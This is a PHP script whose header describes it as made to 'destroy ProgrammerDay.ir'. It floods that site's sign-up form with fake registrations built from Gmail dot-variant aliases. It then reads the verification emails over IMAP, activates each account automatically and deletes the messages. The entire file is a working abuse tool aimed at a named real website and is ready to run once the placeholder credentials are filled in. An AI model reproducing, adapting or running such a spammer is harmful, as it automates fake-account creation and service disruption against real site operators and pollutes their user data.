<?php

/**
 * Programmer Day Spammer
 * The script made to destroy ProgrammerDay.ir
 * By NimaH79
 * NimaH79.ir.
 */
class ProgrammerDaySpammer
{
    private $username;
    private $password;
    private $name;

    public function __construct($username, $password, $name)
    {
        $this->username = $username;
        $this->password = $password;
        $this->name = $name;
    }

    public function start()
    {
        $mail_aliases = $this->generateGmailAliases($this->username);
        shuffle($mail_aliases);
        $i = 0;
        foreach ($mail_aliases as $mail_alias) {
            $this->register($this->name, $mail_alias);
            $i++;
            if ($i >= 5) {
                $links = $this->getVerificationLinks($this->username, $this->password);
                foreach ($links as $link) {
                    $this->activate($link);
                }
                $i = 0;
            }
        }
    }

    private function getVerificationLinks($username, $password)
    {
        $inbox = imap_open('{imap.gmail.com:993/imap/ssl}INBOX', $username, $password);
        if (!$inbox) {
            return [];
        }
        $emails = imap_search($inbox, 'FROM "hi@programmerday.ir"');
        $links = [];
        $msgnos = [];
        if ($emails) {
            $output = '';
            rsort($emails);
            foreach ($emails as $email_number) {
                $overview = imap_fetch_overview($inbox, $email_number, 0);
                $message = imap_fetchbody($inbox, $email_number, 2);
                $msgnos[] = $overview[0]->msgno;
                if (preg_match('/http:\/\/programmerday\.ir\/\?scc=[a-zA-z0-9]+/', $message, $link)) {
                    $link = $link[0];
                    $links[] = $link;
                }
            }
        }
        foreach ($msgnos as $msgno) {
            imap_delete($inbox, $msgno);
        }
        imap_close($inbox);

        return $links;
    }

    private function generateGmailAliases($email)
    {
        $email = str_replace('@gmail.com', '', $email);
        $email = str_replace('.', '', $email);
        if (strlen($email) >= 2 && strlen($email) <= 64) {
            $ca = preg_split('//', $email);
            array_shift($ca);
            array_pop($ca);
            $head = array_shift($ca);
            $res = $this->generateGmailAliases(implode('', $ca));
            $result = [];
            foreach ($res as $val) {
                $result[] = $head.$val;
                $result[] = $head.'.'.$val;
            }
            foreach ($result as $key => &$value) {
                if (strpos($value, '@gmail.com') === false) {
                    $value = $value.'@gmail.com';
                }
            }

            return $result;
        }

        return [$email];
    }

    private function register($name, $email)
    {
        $ch = curl_init('http://programmerday.ir/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ['fullname' => $name, 'email' => $email]);
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    private function activate($url)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}

$pday = new ProgrammerDaySpammer('YOUR_GMAIL_ADDRESS', 'YOUR_GMAIL_PASSWORD', 'YOUR_NAME');
$pday->start();
